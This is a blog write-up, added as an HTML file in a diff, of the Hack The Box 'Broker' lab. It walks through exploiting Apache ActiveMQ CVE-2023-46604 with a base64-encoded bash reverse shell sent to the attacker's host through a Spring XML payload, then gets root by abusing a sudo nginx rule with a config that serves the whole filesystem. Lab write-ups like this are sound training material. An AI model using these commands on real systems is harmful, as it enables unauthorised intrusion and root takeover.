@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Broker (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Broker from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/broker/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Broker (Easy)">
+<meta property="og:description" content="Writeup of Broker from Hack The Box." />
+<meta property="og:url" content="/posts/broker/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-11-18 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/broker/">HTB Writeup - Broker (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-11-18</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Broker</code> machine is an easy linux box.</p>
+<p><img src="/images/Broker.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap scan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -A 10.10.11.243     
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-11-18 13:28 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.243
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-auth: 
+</span></span><span style="display:flex;"><span>| HTTP/1.1 <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\x</span>0D
+</span></span><span style="display:flex;"><span>|_  basic realm<span style="color:#f92672">=</span>ActiveMQRealm
+</span></span><span style="display:flex;"><span>|_http-title: Error <span style="color:#ae81ff">401</span> Unauthorized
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 33.54 seconds
+</span></span></code></pre></div><p>I see a strange service (<code>ActiveMQRealm</code>) I search a port standard to this service and then I try to see if this port is open</p>
+<p>I search <code>port of ActiveMQ</code> and I  find the <code>Port 61616</code>, I do another nmap scan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -A -p61616  10.10.11.243
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-11-18 13:35 EST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.243
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>61616/tcp open  apachemq ActiveMQ OpenWire transport
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   NULL: 
+</span></span><span style="display:flex;"><span>|     ActiveMQ
+</span></span><span style="display:flex;"><span>|     TcpNoDelayEnabled
+</span></span><span style="display:flex;"><span>|     SizePrefixDisabled
+</span></span><span style="display:flex;"><span>|     CacheSize
+</span></span><span style="display:flex;"><span>|     ProviderName 
+</span></span><span style="display:flex;"><span>|     ActiveMQ
+</span></span><span style="display:flex;"><span>|     StackTraceEnabled
+</span></span><span style="display:flex;"><span>|     PlatformDetails 
+</span></span><span style="display:flex;"><span>|     Java
+</span></span><span style="display:flex;"><span>|     CacheEnabled
+</span></span><span style="display:flex;"><span>|     TightEncodingEnabled
+</span></span><span style="display:flex;"><span>|     MaxFrameSize
+</span></span><span style="display:flex;"><span>|     MaxInactivityDuration
+</span></span><span style="display:flex;"><span>|     MaxInactivityDurationInitalDelay
+</span></span><span style="display:flex;"><span>|     ProviderVersion 
+</span></span><span style="display:flex;"><span>|_    5.15.15
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port61616-TCP:V<span style="color:#f92672">=</span>7.94%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>11/18%Time<span style="color:#f92672">=</span>65590409%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>SF:NULL,140,<span style="color:#e6db74">&#34;\0\0\x01&lt;\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\x11
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:5\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled\x0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:1\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x14T
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\x1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:5MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationInit
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:alDelay\x06\0\0\0\0\0\0&#39;\x10\0\x0fProviderVersion\t\0\x075\.15\.15&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.42 seconds
+</span></span></code></pre></div><p>The version to this service is the <code>5.15.15</code></p>
+<h2 id="foothold">Foothold<a href="#foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>For this version I find this exploit <code>https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ</code> , now I download this exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
+</span></span><span style="display:flex;"><span>Cloning into <span style="color:#e6db74">&#39;CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ&#39;</span>...
+</span></span><span style="display:flex;"><span>remote: Enumerating objects: 20, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>20/20<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>15/15<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">20</span> <span style="color:#f92672">(</span>delta 7<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">9</span> <span style="color:#f92672">(</span>delta 3<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Receiving objects: 100% <span style="color:#f92672">(</span>20/20<span style="color:#f92672">)</span>, 1.64 MiB | 7.31 MiB/s, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>Resolving deltas: 100% <span style="color:#f92672">(</span>7/7<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ go build -ldflags <span style="color:#e6db74">&#39;-s -w&#39;</span> .
+</span></span><span style="display:flex;"><span>go build: when using gccgo toolchain, please pass linker flags using -gccgoflags, not -ldflags
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ upx ActiveMQ-RCE
+</span></span><span style="display:flex;"><span>                       Ultimate Packer <span style="color:#66d9ef">for</span> eXecutables
+</span></span><span style="display:flex;"><span>                          Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">1996</span> - <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        File size         Ratio      Format      Name
+</span></span><span style="display:flex;"><span>   --------------------   ------   -----------   -----------
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">78208</span> -&gt;     <span style="color:#ae81ff">31340</span>   40.07%   linux/amd64   ActiveMQ-RCE                  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Packed <span style="color:#ae81ff">1</span> file.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ pwd                        
+</span></span><span style="display:flex;"><span>/home/kali/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
+</span></span></code></pre></div><p>I open a Web Server in a new terminal session:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd ~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 -m http.server <span style="color:#ae81ff">8001</span>                                 
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8001</span> <span style="color:#f92672">(</span>http://0.0.0.0:8001/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>I convert this to base64 to send the connection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo -n <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.125/8443 0&gt;&amp;1&#39;&#34;</span> | base64 -w <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjUvODQ0MyAwPiYxJw<span style="color:#f92672">==</span>                             
+</span></span></code></pre></div><p>I edit the <code>poc-linux.xml</code> in this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat poc-linux.xml
+</span></span><span style="display:flex;"><span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span> encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span> ?&gt;
+</span></span><span style="display:flex;"><span>&lt;beans xmlns<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.springframework.org/schema/beans&#34;</span>
+</span></span><span style="display:flex;"><span>   xmlns:xsi<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
+</span></span><span style="display:flex;"><span>   xsi:schemaLocation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;bean id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pb&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;java.lang.ProcessBuilder&#34;</span> init-method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;start&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;constructor-arg&gt;
+</span></span><span style="display:flex;"><span>        &lt;list&gt;
+</span></span><span style="display:flex;"><span>            &lt;value&gt;sh&lt;/value&gt;
+</span></span><span style="display:flex;"><span>            &lt;value&gt;-c&lt;/value&gt;
+</span></span><span style="display:flex;"><span>            &lt;!-- The command below downloads the file and saves it as test.elf --&gt;
+</span></span><span style="display:flex;"><span>            &lt;value&gt;echo -n YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjUvODQ0MyAwPiYxJw<span style="color:#f92672">==</span> | base64 -d | bash&lt;/value&gt;
+</span></span><span style="display:flex;"><span>        &lt;/list&gt;
+</span></span><span style="display:flex;"><span>        &lt;/constructor-arg&gt;
+</span></span><span style="display:flex;"><span>    &lt;/bean&gt;
+</span></span><span style="display:flex;"><span>&lt;/beans&gt;
+</span></span></code></pre></div><p>I open a Listening Port:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">8443</span> 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8443</span> ...
+</span></span></code></pre></div><p>I run the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./ActiveMQ-RCE -i 10.10.11.243 -u http://10.10.14.125:8001/poc-linux.xml
+</span></span><span style="display:flex;"><span>     _        _   _           __  __  ___        ____   ____ _____ 
+</span></span><span style="display:flex;"><span>    / <span style="color:#ae81ff">\ </span>  ___| |_<span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>_   _____|  <span style="color:#ae81ff">\/</span>  |/ _ <span style="color:#ae81ff">\ </span>     |  _ <span style="color:#ae81ff">\ </span>/ ___| ____|
+</span></span><span style="display:flex;"><span>   / _ <span style="color:#ae81ff">\ </span>/ __| __| <span style="color:#ae81ff">\ \ </span>/ / _ <span style="color:#ae81ff">\ </span>|<span style="color:#ae81ff">\/</span>| | | | |_____| |_<span style="color:#f92672">)</span> | |   |  _|  
+</span></span><span style="display:flex;"><span>  / ___ <span style="color:#ae81ff">\ </span><span style="color:#f92672">(</span>__| |_| |<span style="color:#ae81ff">\ </span>V /  __/ |  | | |_| |_____|  _ &lt;| |___| |___ 
+</span></span><span style="display:flex;"><span> /_/   <span style="color:#ae81ff">\_\_</span>__|<span style="color:#ae81ff">\_</span>_|_| <span style="color:#ae81ff">\_</span>/ <span style="color:#ae81ff">\_</span>__|_|  |_|<span style="color:#ae81ff">\_</span>_<span style="color:#ae81ff">\_\ </span>    |_| <span style="color:#ae81ff">\_\\</span>____|_____|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target: 10.10.11.243:61616
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> XML URL: http://10.10.14.125:8001/poc-linux.xml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending packet: 000000791f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010026687474703a2f2f31302e31302e31342e3132353a383030312f706f632d6c696e75782e786d6c
+</span></span></code></pre></div><p>I Spawn the Reverse Shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nc -lnvp <span style="color:#ae81ff">8443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.125<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.243<span style="color:#f92672">]</span> <span style="color:#ae81ff">48050</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>883<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>activemq@broker:/opt/apache-activemq-5.15.15/bin$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>activemq
+</span></span><span style="display:flex;"><span>activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
+</span></span></code></pre></div><p>I read the <code>user flag</code></p>
+<pre tabindex="0"><code>activemq@broker:/opt/apache-activemq-5.15.15/bin$ cat /home/activemq/user.txt          
+cat /home/activemq/user.txt
+042ebb1a779f87500482bb0e7122958f
+</code></pre><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see all the <code>sudo privileges</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>activemq@broker:/opt/apache-activemq-5.15.15/bin$ sudo -l
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> activemq on broker:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span>    use_pty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User activemq may run the following commands on broker:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/sbin/nginx
+</span></span><span style="display:flex;"><span>activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
+</span></span></code></pre></div><p>Ok,the privesc it&rsquo;s very easy because I can open a Web Server like root and via http I can read the root flag</p>
+<p>I create a custom configuration. I will create the file <code>privesc.conf</code> in the <code>/tmp</code> directory with the following content:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>user root;  
+</span></span><span style="display:flex;"><span>worker_processes auto;  
+</span></span><span style="display:flex;"><span>pid /run/nginx2.pid;  
+</span></span><span style="display:flex;"><span>include /etc/nginx/modules-enabled/*.conf;  
+</span></span><span style="display:flex;"><span>events <span style="color:#f92672">{</span>  
+</span></span><span style="display:flex;"><span>worker_connections 1024;  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>  
+</span></span><span style="display:flex;"><span>http <span style="color:#f92672">{</span>  
+</span></span><span style="display:flex;"><span>server <span style="color:#f92672">{</span>  
+</span></span><span style="display:flex;"><span>listen 7777;  
+</span></span><span style="display:flex;"><span>location / <span style="color:#f92672">{</span>  
+</span></span><span style="display:flex;"><span>root /;  
+</span></span><span style="display:flex;"><span>autoindex on;  
+</span></span><span style="display:flex;"><span>dav_methods PUT;  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>I add my custom configuration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>activemq@broker:/tmp$ sudo /usr/sbin/nginx -c /tmp/privesc.conf
+</span></span><span style="display:flex;"><span>sudo /usr/sbin/nginx -c /tmp/privesc.conf
+</span></span></code></pre></div><p>Now I do a HTTP Request to have the <code>root flag</code>:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/Broker/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ]
+└─$ curl http://10.10.11.243:7777/root/root.txt                 
+04c7082fe17721d78e511c13f08d66f7
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/analytics/">
+                <span class="button__text">HTB Writeup - Analytics (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
